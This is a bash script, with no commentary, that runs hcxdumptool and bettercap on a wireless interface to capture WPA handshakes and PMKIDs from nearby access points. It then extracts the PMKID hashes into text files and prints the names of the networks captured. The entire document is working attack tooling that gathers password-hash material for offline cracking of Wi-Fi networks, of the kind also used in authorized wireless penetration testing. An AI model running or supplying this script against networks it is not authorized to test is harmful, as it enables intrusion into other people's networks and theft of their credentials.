#!/bin/bash

mkdir -p ~/captures/
cd ~/captures/

hcxdumptool -i wlan1 -o "$(date +%Y%m%d_%H%M%S)-handshakes_hcxdumptool.pcapng" --enable_status=1 | tee "$(date +%Y%m%d_%H%M%S)-session_hcxdumptool.log" &
sleep 1
/opt/bettercap/bettercap -eval "events.ignore wifi.ap.lost; events.ignore wifi.client.probe; events.ignore wifi.client.new; set wifi.handshakes.file $(date +%Y%m%d_%H%M%S)-handshakes_bettercap.pcap; wifi.recon on" | tee "$(date +%Y%m%d_%H%M%S)-session_bettercap.log"
sleep 1
killall hcxdumptool
sleep 2

echo "Extracting PMKID hashes from PCAP files..."
for pcap_file in $(ls -1 *.pcap*); do
    hcxpcaptool -z "$pcap_file.pmkid.txt" "$pcap_file"
done

echo "PMKIDs captured for the following APs:"
python -c "import glob, binascii, pprint; pprint.pprint(set([binascii.unhexlify(line.split('*')[-1]) for line in sum([open(hcf).read().splitlines() for hcf in glob.glob('*.pmkid.txt')], [])]))"
